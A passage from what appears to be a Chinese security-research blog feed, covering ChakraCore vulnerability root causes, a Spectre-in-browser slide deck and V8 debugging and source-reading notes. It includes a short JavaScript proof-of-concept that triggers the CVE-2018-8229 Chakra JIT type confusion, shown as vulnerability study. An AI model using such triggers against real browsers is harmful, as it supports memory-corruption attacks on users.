rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/construct</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflect.construct(target, argumentsList[, newTarget])</span><br></pre></td></tr></table></figure></li></ul><p>不引入newTarget这个可选参数，就和new target(…args)用法一致<br>但是引入的话，就是为了在一些框架里满足一种罕见的需求，也就是要求<strong>用target来初始化实例，但是却要求表现出来的结果是newTarget的实例</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-072310.png" alt=""></p><ul><li>root cause<br>漏洞成因是BoundFunction::NewInstance在调用Target函数时，没有考虑到CallFlags_ExtraArg这个flag，所以没有拷贝ExtraArg(这里也就是newTarget)。<br>从patch里可以看到，在patch之后，考虑到了这个flag。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+           <span class="keyword">if</span> (args.HasExtraArg())</span><br><span class="line">+            &#123;</span><br><span class="line">+                newValues[index++] = args.Values[argCount];</span><br><span class="line">+            &#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-083423.jpg" alt=""><br><strong>但仍有CallFlags_NewTarget标记</strong>。<br>导致在后面真正调用Target函数的时候，在InterpreterStackFrame::OP_LdNewTarget时，会从栈上的Args数组越界读取8个字节的内容<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-093809.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-093857.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-093906.jpg" alt=""></p><ul><li>info leak<br>能不能布置栈上数据？</li><li>how to find?<br>对标志位的处理，逻辑bug，审计？</li></ul><h2 id="v1-8-4"><a href="#v1-8-4" class="headerlink" title="v1.8.4"></a>v1.8.4</h2><h3 id="CVE-2018-8229"><a href="#CVE-2018-8229" class="headerlink" title="CVE-2018-8229"></a>CVE-2018-8229</h3><ul><li>Microsoft Edge: Chakra: JIT: Type confusion with hoisted SetConcatStrMultiItemBE instructions<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1560" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1560</a></li><li>Patch<br><a href="https://github.com/Microsoft/ChakraCore/commit/9b270c55bfea2fbefc9482d3414c4b4b395cad10" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/9b270c55bfea2fbefc9482d3414c4b4b395cad10</a></li><li>PoC<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = str.charCodeAt(<span class="string">'AAAAAAAAAA'</span> + str + <span class="string">'BBBBBBBBBB'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opt(<span class="string">'x'</span>);</span><br><span class="line">opt(<span class="number">0x1234</span>);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> edge </tag>
            
            <tag> chrome </tag>
            
            <tag> safari </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>被“幽灵”困扰的浏览器</title>
      <link href="/2018/07/21/kanxue/"/>
      <url>/2018/07/21/kanxue/</url>
      <content type="html"><![CDATA[<h3 id="Spectre"><a href="#Spectre" class="headerlink" title="Spectre"></a>Spectre</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-091936.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092124.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092223.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092249.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092330.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092420.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092444.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092549.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092615.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092651.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092739.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092800.png" alt=""></p><h3 id="Spectre-in-Browser"><a href="#Spectre-in-Browser" class="headerlink" title="Spectre in Browser"></a>Spectre in Browser</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092827.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093023.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093134.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093251.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093319.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093333.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093354.png" alt=""></p><h3 id="Real-attack-of-“Spectre”"><a href="#Real-attack-of-“Spectre”" class="headerlink" title="Real attack of “Spectre”"></a>Real attack of “Spectre”</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093508.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093520.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093537.png" alt=""></p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093627.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>在mac上使用xcode调试v8</title>
      <link href="/2018/07/20/v8_xcode/"/>
      <url>/2018/07/20/v8_xcode/</url>
      <content type="html"><![CDATA[<h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>最近在看chakra的漏洞，用为知笔记记一些零散的或者思路性的东西还是蛮方便，chakra有点不想搞2333，把0234搞完了继续看v8咯。<br>然后命令行调试还是太太太麻烦了，于是在VPN搭好了之后，就在xcode上干活了。</p><h2 id="搭建VPN并连接"><a href="#搭建VPN并连接" class="headerlink" title="搭建VPN并连接"></a>搭建VPN并连接</h2><p>在之前搭ss的服务器上运行一个vpn的docker(人生苦短，我用docker)<br>直接切换到root然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">    --name ipsec-vpn-server \</span><br><span class="line">    --restart=always \</span><br><span class="line">    -e VPN_IPSEC_PSK=你的密码 \</span><br><span class="line">    -e VPN_USER=你的用户名 \</span><br><span class="line">    -e VPN_PASSWORD=你的共享密码（其实和密码填一样就好了，不会弄混） \</span><br><span class="line">    -p 500:500/udp \</span><br><span class="line">    -p 4500:4500/udp \</span><br><span class="line">    -v /lib/modules:/lib/modules:ro \</span><br><span class="line">    -d --privileged \</span><br><span class="line">    hwdsl2/ipsec-vpn-server</span><br></pre></td></tr></table></figure></p><p>连接VPN<br><a href="http://www.vpngate.net/cn/howto_l2tp.aspx" target="_blank" rel="noopener">http://www.vpngate.net/cn/howto_l2tp.aspx</a></p><h2 id="mac上编译"><a href="#mac上编译" class="headerlink" title="mac上编译"></a>mac上编译</h2><p>怎么获取源码，终端编译之前已经写过了，懒得赘述。<br>这里讲一下怎么建立xcode工程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gn gen out/gn --ide=&quot;xcode&quot;</span><br></pre></td></tr></table></figure></p><p>这样，在out目录下就会有gn文件夹，里面有all.xcworkspace文件，可以直接使用xcode打开这个工作区文件，接下来要设置编译的目标，在Product-&gt;Scheme下选择d8，否则会编译出错，这样就只编译d8这个可执行程序，使用d8就可以直接调试v8的源代码。<br>然后直接Build，编译时间有些长，会自动生成v8的链接库，等待编译完成，在Product-&gt;EditScheme菜单中把poc文件作为运行参数，在对应文件中下好断点，直接运行就会断下来了。</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>噫，我好像只是教了怎么搭VPN……</p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>V8 javascript engine代码阅读</title>
      <link href="/2018/07/09/zujian/"/>
      <url>/2018/07/09/zujian/</url>
      <content type="html"><![CDATA[<h2 id="v8代码组成"><a href="#v8代码组成" class="headerlink" title="v8代码组成"></a>v8代码组成</h2><h3 id="目录结构概要"><a href="#目录结构概要" class="headerlink" title="目录结构概要"></a>目录结构概要</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">src ---+</span><br><span class="line">       |</span><br><span class="line">       +---arm</span><br><span class="line">       +---arm64</span><br><span class="line">       +---mips</span><br><span class="line">       +---mips64</span><br><span class="line">A      +---ia32</span><br><span class="line">       +---x64</span><br><span class="line">       +---ppc</span><br><span class="line">       +---s390</span><br><span class="line">       +---wasm</span><br><span class="line">       +---asmjs</span><br><span class="line">       |</span><br><span class="line">       +---ast</span><br><span class="line">       +---compiler</span><br><span class="line">B      +---compiler-dispatcher</span><br><span class="line">       +---interpreter</span><br><span class="line">       +---parsing</span><br><span class="line">       |</span><br><span class="line">       +---js</span><br><span class="line">       +---builtins</span><br><span class="line">C      +---runtime</span><br><span class="line">       +---snapshot</span><br><span class="line">       +---regexp</span><br><span class="line">       +---profiler</span><br><span class="line">       |</span><br><span class="line">D      +---ic</span><br><span class="line">       |</span><br><span class="line">       +---heap</span><br><span class="line">E      +---heap-symbols.h</span><br><span class="line">       +---zone</span><br><span class="line">       +---objects</span><br><span class="line">       |</span><br><span class="line">F      +---inspector</span><br><span class="line">       |</span><br><span class="line">       +---base</span><br><span class="line">       +---debug</span><br><span class="line">       +---tracing</span><br><span class="line">       +---extensions</span><br><span class="line">G      +---libplatform</span><br><span class="line">       +---libsampler</span><br><span class="line">       +---third_party</span><br><span class="line">       +---trap-handler</span><br><span class="line">       |</span><br><span class="line">       +---*.cc<span class="comment">/*.h</span></span><br><span class="line"><span class="comment">       .</span></span><br><span class="line"><span class="comment">       .</span></span><br><span class="line"><span class="comment">       .</span></span><br></pre></td></tr></table></figure><ul><li>A:存储汇编代码，反汇编程序，宏汇编程序，模拟器等，对于不同CPU不同。</li><li>B:code generation系统，例如parse, compile, interpreter, etc.</li><li>C:JS built-in function和runtime helper function</li><li>D:Inline Cache code </li><li>E:object model(对象模型)和memory(内存)相关代码</li><li>F:Inspector</li><li>G:Debugging and platform abstraction layer codes are stored.</li></ul><h3 id="必读代码"><a href="#必读代码" class="headerlink" title="必读代码"></a>必读代码</h3><ul><li>api.h/api.cc<br>An API for Embedder is defined.</li><li>objects.h/objects.cc<br>定义了v8的所有对象模型</li><li>compiler/compiler.cc<br>编译的入口点</li><li>compiler/pipeline.cc<br>和compiler.cc关联，放置TurboFan</li><li>runtime/runtime-*.cc<br>A runtime function is defined.</li><li>builtins/builtin-*.cc<br>A faster runtime function group. It is described in CodeStubAssembler (commentary) or Assembler.</li><li>interpreter/*.cc<br>Ignition解释器</li><li>ic/*.cc<br>Inline Caching的实现<br>存储Runtime(?)</li></ul><h2 id="v8的内部实现"><a href="#v8的内部实现" class="headerlink" title="v8的内部实现"></a>v8的内部实现</h2><h3 id="公开API"><a href="#公开API" class="headerlink" title="公开API"></a>公开API</h3><ul><li>v8::HandleScope<br>生成一个虚拟的作用域，监视（绑定）从v8的GC分配的对象</li><li>v8::Local<br>v8有GC，但c++没有GC<br>相反，它通过<a href="https://zh.wikipedia.org/wiki/RAII" target="_blank" rel="noopener">RAII</a> (Resource Acquisition Is Initialization)分配和释放资源<br>在C++中有一个称为析构函数的函数，当分配到stack上的类超出作用域并被丢弃时，该函数被调用。<br>通过v8::Local，当超出了类的作用域时，会自动调用析构函数，析构函数会自动释放资源，实现一种所谓的<a href="http://www.cnblogs.com/TenosDoIt/p/3456704.html" target="_blank" rel="noopener">智能指针</a>功能。<br>v8::Local是一个包装类，用于监视在c++中分配给堆的对象，并在调用析构函数时与当前的HandleScope一起删除。<br>例如：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  v8::Isolate* isolate = v8::Isolate::GetCurrent();</span><br><span class="line">  v8::HandleScope handle_scope;</span><br><span class="line"></span><br><span class="line">  v8::Local&lt;v8::Array&gt; <span class="built_in">array</span> = v8::Array::New(isolate, <span class="number">3</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>创建v8::HandleScope后，所有v8::Local都将分配给该v8::HandleScope。<br>因此，当在测试函数结束时调用handle_scope析构函数时，也会删除与v8 :: HandleScope相关的所有v8::Local。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-124518.png" alt=""></p><ul><li>v8::Handle<br>被v8::Local包装的类，但实际上链接到v8::HandleScope。<br>有些api会返回这个v8::Handle，但基本上它就像v8::Local一样使用。</li><li>v8::Isolate<br>v8::Isolate是v8代码库底层部分的一个非常特殊的部分。<br>最初v8有很多静态方法，对多线程没有太多考虑。<br>嗯，这是有问题的，因为Chromium必须分离进程并启动v8。<br>顺便说一句，事实证明，在Embedder端尝试多线程会导致相当大的问题。<br>出于这个原因，构建了v8::Isolate机制。<br>v8::Isolate是一个存储在<a href="https://blog.csdn.net/linyt/article/details/51931737" target="_blank" rel="noopener">线程本地存储（TLS）</a>中的巨大对象<br>几乎存储了与执行上下文链接的所有全局信息。<br>由于它存储在Tls中，因此可以透明地为每个线程提供不同的v8::Isolate，因此Embedder端可以在对其他线程不了解的情况下编写代码。<br><strong>内部使用的各种对象（FixedArray）和表示隐藏类等的Map类也是从这个v8::Isolate生成的</strong>。<br>几乎所有地方都传递了这个类，没有v8::Isolate就很难编写代码。<br>再次使用上面的示例代码<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-09-102213.jpg" alt=""><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  v8::Isolate* isolate = v8::Isolate::GetCurrent();</span><br><span class="line">  v8::HandleScope handle_scope;</span><br><span class="line"></span><br><span class="line">  v8::Local&lt;v8::Array&gt; <span class="built_in">array</span> = v8::Array::New(isolate, <span class="number">3</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>你还可以看到此函数也传递了v8::Isolate。<br>它是v8::Array::New等等，但是v8::Isoalte实际上生成了这个数组。<br>因此，在v8中，没有太多需要考虑线程冲突，所以这是一个相当方便的机制。</p><h3 id="v8-internal"><a href="#v8-internal" class="headerlink" title="v8::internal"></a>v8::internal</h3><p>除了外部公共API之外的所有类，都在v8::internal命名空间中定义。</p><h3 id="对象模型"><a href="#对象模型" class="headerlink" title="对象模型"></a>对象模型</h3><p>v8非常特殊，它在C++中创建自己的对象模型。<br>该对象模型在src/objects.h的开头注释中描述，<br>当它被简化和提取时，就会变成这样。</p><ul><li>Object<ul><li>Smi (immediate small integer)</li><li>HeapObject (superclass for everything allocated in the heap)<ul><li>JSReceiver (suitable for property access)<ul><li>JSObject</li><li>JSProxy</li></ul></li><li>FixedArrayBase<ul><li>ByteArray</li><li>BytecodeArray</li><li>FixedArray</li><li>FixedDoubleArray</li></ul></li><li>Name<ul><li>String</li><li>Symbol</li></ul></li><li>HeapNumber</li><li>BigInt</li><li>Cell</li><li>PropertyCell</li><li>PropertyArray</li><li>Code</li><li>AbstractCode, a wrapper around Code or BytecodeArray</li><li>Map</li><li>Oddball</li><li>Foreign</li><li>SmallOrderedHashTable</li><li>SharedFunctionInfo</li><li>Struct</li><li>WeakCell</li><li>FeedbackVector</li></ul></li></ul></li></ul><p>我们创建了一个以v8::i::Object为基类的对象树。<br>几乎所有在v8中使用的类都继承自v8::i::Object，这看起来像java。<br>v8不遵循c++方式使这个对象模型运行良好。<br>由于某些原因，这些类不通过c++类来创建字段。<br>这些类仅用于表示c++中的内存布局，并且所有字段都是通过直接为此指针指定偏移量来获得的。<br>换句话说，忽略c++对象布局，我们自己完全控制内存布局。<br>当以伪代码表示时，看起来像这样：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Class SomeObject &#123;</span><br><span class="line">  <span class="function">Value* <span class="title">get_field1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* self = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(<span class="keyword">this</span>);</span><br><span class="line">    self += header_offset;</span><br><span class="line">    <span class="keyword">return</span> Value::Cast(self);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Initialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* self = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(<span class="keyword">this</span>);</span><br><span class="line">    self += header_offset;</span><br><span class="line">    *self = Smi::Cast(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">size_t</span> OBJECT_SIZE = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">32</span>;</span><br><span class="line">SomeObject* object = <span class="keyword">reinterpret_cast</span>&lt;SomeObject*&gt;(<span class="built_in">malloc</span>(OBJECT_SIZE));</span><br><span class="line">object-&gt;Initialize();</span><br><span class="line">object-&gt;get_filed1(); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p><p>通过这种方式，你可以自己控制字段的偏移。<br>让我们了解一下层次结构顶端的两个分支：</p><h3 id="HeapObject"><a href="#HeapObject" class="headerlink" title="HeapObject"></a>HeapObject</h3><p>首先是v8::i::HeapObject。<br>由于v8::i::Object建立了如上所述的直接通过偏移的内存布局<br>在访问字段时，继承HeapObject的对象使用以下宏。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIELD_ADDR(p, offset) \</span></span><br><span class="line">  (<span class="keyword">reinterpret_cast</span>&lt;byte*&gt;(p) + offset - kHeapObjectTag)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ_FIELD(p, offset) \</span></span><br><span class="line">  (*<span class="keyword">reinterpret_cast</span>&lt;Object* <span class="keyword">const</span>*&gt;(FIELD_ADDR_CONST(p, offset)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这是在GC并发标记为ON时以原子方式更新字段</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> v8_CONCURRENT_MARKING</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_FIELD(p, offset, value)                             \</span></span><br><span class="line">  base::Relaxed_Store(                                            \</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord*&gt;(FIELD_ADDR(p, offset)), \</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord&gt;(value));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_FIELD(p, offset, value) \</span></span><br><span class="line">  (*<span class="keyword">reinterpret_cast</span>&lt;Object**&gt;(FIELD_ADDR(p, offset)) = value)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">SMI_ACCESSORS(FixedArrayBase, length, kLengthOffset)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMI_ACCESSORS_CHECKED(holder, name, offset, condition) \</span></span><br><span class="line">  <span class="keyword">int</span> holder::name() <span class="keyword">const</span> &#123;                                   \</span><br><span class="line">    DCHECK(condition);                                         \</span><br><span class="line">    Object* value = READ_FIELD(<span class="keyword">this</span>, offset);                  \</span><br><span class="line">    <span class="keyword">return</span> Smi::ToInt(value);                                  \</span><br><span class="line">  &#125;                                                            \</span><br><span class="line">  <span class="keyword">void</span> holder::set_#<span class="meta">#name(int value) &#123;                         \</span></span><br><span class="line">    DCHECK(condition);                                         \</span><br><span class="line">    WRITE_FIELD(<span class="keyword">this</span>, offset, Smi::FromInt(value));            \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际上它扩展如下。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> FixedArrayBase::length() <span class="keyword">const</span> &#123;</span><br><span class="line">  DCHECK(condition);</span><br><span class="line">  Object* value = (*<span class="keyword">reinterpret_cast</span>&lt;Object* <span class="keyword">const</span>*&gt;(</span><br><span class="line">  <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> byte*&gt;(<span class="keyword">this</span>) + kLengthOffset - kHeapObjectTag)</span><br><span class="line">  <span class="keyword">return</span> Smi::ToInt(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> FixedArrayBase::set_length(<span class="keyword">int</span> value) <span class="keyword">const</span> &#123;</span><br><span class="line">  DCHECK(condition);</span><br><span class="line">  base::Relaxed_Store(</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord*&gt;(</span><br><span class="line">          <span class="keyword">reinterpret_cast</span>&lt;byte*&gt;(<span class="keyword">this</span>) + kLengthOffset - kHeapObjectTag);</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord&gt;(Smi::FromInt(value)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>重要的是<br><code>reinterpret_cast&lt;const byte*&gt;(this) + kLengthOffset - kHeapObjectTag</code><br>在这部分中，我们看到在将特定字段的偏移量添加到此指针后减去kHeapObjectTag。<br>顺便说一句，kHeapObjectTag的定义如下。<br><code>const int kHeapObjectTag = 1</code><br>只有1，也就是说，只需在指针地址的末尾设置1即可。</p><p>以下是示例代码<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTagSize = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">intptr_t</span> kHeapObjectTagMask = (<span class="number">1</span> &lt;&lt; kHeapObjectTagSize) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">HasHeapObjectTag</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(value) &amp; kHeapObjectTagMask) ==</span><br><span class="line">          kHeapObjectTag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> allocated = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(</span><br><span class="line">      <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (<span class="number">2</span> + kHeapObjectTag)));</span><br><span class="line">  <span class="keyword">auto</span> heap_object = allocated + kHeapObjectTag;</span><br><span class="line">  heap_object[<span class="number">0</span>] = <span class="string">'m'</span>;</span><br><span class="line">  heap_object[<span class="number">1</span>] = <span class="string">'v'</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%ld %ld %p %p %d\n"</span>, <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(allocated),</span><br><span class="line">         <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(heap_object), allocated, heap_object,</span><br><span class="line">         HasHeapObjectTag(heap_object));</span><br><span class="line">  <span class="built_in">free</span>(allocated);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果如下：<br><code>140289524108464 140289524108465 0x7f97b3400cb0 0x7f97b3400cb1 